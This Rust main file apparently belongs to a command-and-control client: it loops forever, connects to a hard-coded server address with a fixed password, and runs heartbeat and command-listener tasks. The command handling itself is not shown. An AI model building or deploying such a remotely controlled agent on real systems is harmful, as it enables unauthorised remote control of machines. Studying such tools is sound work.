use nanar_client::*;

#[tokio::main]
async fn main() {

    // Connection vars
    const SERVER_ADDR: &str = "127.0.0.1";
    const SERVER_PORT: &str = "9999";
    const INIT_CONNECTION_PASS: &str = "WHAT";

    loop {

        // First Initilize the connection
        match connection_handler::init_conn_with_server(SERVER_ADDR, SERVER_PORT, INIT_CONNECTION_PASS).await {
            Ok(_) => {

                println!("[+] Connection Initilization succeeded from the main");
                println!("[+] Now the client will run the listening for the commands & Run the heartbeat communications");

                /*
                    The client in the idle mood run both the heartbeat function and the command listing function.
                */
                let heartbeat_task: tokio::task::JoinHandle<Result<(), std::io::Error>> = tokio::spawn(
                    connection_handler::heartbeat(
                        connection_handler::convert_ip_port_to_sockaddr(SERVER_ADDR, SERVER_PORT),
                        messages::HEARTBEAT_NO_ACTION)
                );
                    
                let commands_listener_task: tokio::task::JoinHandle<()> = tokio::spawn(
                    connection_handler::commands_communication_handler(SERVER_ADDR, SERVER_PORT, INIT_CONNECTION_PASS));
                
                let _ = tokio::join!(heartbeat_task, commands_listener_task);
            },
            Err(e) => {

                println!("[-] Could not initilize the connection from the main: {}", e);
                println!("[+] Now the server will go into the heartbeat state");
            }
        }
    }
}